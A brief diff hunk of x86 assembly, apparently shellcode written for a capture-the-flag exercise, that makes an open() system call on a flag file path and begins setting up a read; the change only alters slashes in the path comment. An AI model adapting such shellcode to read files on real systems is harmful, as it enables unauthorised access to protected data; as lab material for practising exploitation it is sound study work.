@@ -12,7 +12,7 @@ _start:
 	mov ecx, eax
 	mov ebx, esp
 	mov al, 0x5
-	int 0x80         ;open("/home//asm//flag", 0);
+	int 0x80         ;open("///home/asm/flag", 0);
 
 	xor edx, edx
 	mov dl, 0x50
